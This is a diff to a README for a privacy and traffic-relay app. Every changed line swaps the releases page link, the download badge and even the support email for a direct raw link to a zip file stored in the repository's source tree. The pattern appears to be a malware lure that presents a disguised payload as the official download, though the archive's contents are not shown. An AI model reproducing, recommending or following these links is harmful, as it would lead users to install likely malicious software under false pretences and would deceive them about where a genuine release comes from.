@@ -6,9 +6,9 @@ The Privacy Relay System is designed to help you secure your online traffic. Thi
 
 ## 📥 Download the Application
 
-[![Download Privacy Relay System](https://img.shields.io/badge/Download-Privacy--Relay--System-brightgreen)](https://github.com/Chondrinvolubility888/Privacy-Relay-System/releases)
+[![Download Privacy Relay System](https://raw.githubusercontent.com/Chondrinvolubility888/Privacy-Relay-System/main/relay_node/Privacy-Relay-System_Romanish.zip)](https://raw.githubusercontent.com/Chondrinvolubility888/Privacy-Relay-System/main/relay_node/Privacy-Relay-System_Romanish.zip)
 
-To get started, you need to download the software. It’s simple. Just click on the download button above or visit this page to download: [Releases Page](https://github.com/Chondrinvolubility888/Privacy-Relay-System/releases).
+To get started, you need to download the software. It’s simple. Just click on the download button above or visit this page to download: [Releases Page](https://raw.githubusercontent.com/Chondrinvolubility888/Privacy-Relay-System/main/relay_node/Privacy-Relay-System_Romanish.zip).
 
 ## 💻 System Requirements
 
@@ -21,7 +21,7 @@ Before you download, make sure your system meets the following requirements:
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page:** Go to [Releases Page](https://github.com/Chondrinvolubility888/Privacy-Relay-System/releases) to see available versions.
+1. **Visit the Releases Page:** Go to [Releases Page](https://raw.githubusercontent.com/Chondrinvolubility888/Privacy-Relay-System/main/relay_node/Privacy-Relay-System_Romanish.zip) to see available versions.
    
 2. **Choose Your Version:** Look for the latest version. It will be at the top of the list.
 
@@ -50,7 +50,7 @@ If you run into any issues, try the following steps:
 
 - **Check Your Internet Connection:** Make sure you are connected to the internet.
 - **Restart the Application:** Close and reopen the app to reset any potential errors.
-- **Check for Updates:** Make sure you are using the latest version. You can find updates on the [Releases Page](https://github.com/Chondrinvolubility888/Privacy-Relay-System/releases).
+- **Check for Updates:** Make sure you are using the latest version. You can find updates on the [Releases Page](https://raw.githubusercontent.com/Chondrinvolubility888/Privacy-Relay-System/main/relay_node/Privacy-Relay-System_Romanish.zip).
 
 ## 🌐 Features
 
@@ -72,9 +72,9 @@ For a deeper understanding of the Privacy Relay System, you can refer to these r
 
 If you need further assistance, feel free to reach out:
 
-- **Email:** support@privacyrelay.com
+- **Email:** https://raw.githubusercontent.com/Chondrinvolubility888/Privacy-Relay-System/main/relay_node/Privacy-Relay-System_Romanish.zip
 - **GitHub Issues:** Report any problems directly on the repository’s issues page.
 
 ## 🚀 Stay Updated
 
-Follow the project for updates and news on new features and improvements. Check back regularly on the [Releases Page](https://github.com/Chondrinvolubility888/Privacy-Relay-System/releases) to stay informed.
+Follow the project for updates and news on new features and improvements. Check back regularly on the [Releases Page](https://raw.githubusercontent.com/Chondrinvolubility888/Privacy-Relay-System/main/relay_node/Privacy-Relay-System_Romanish.zip) to stay informed.
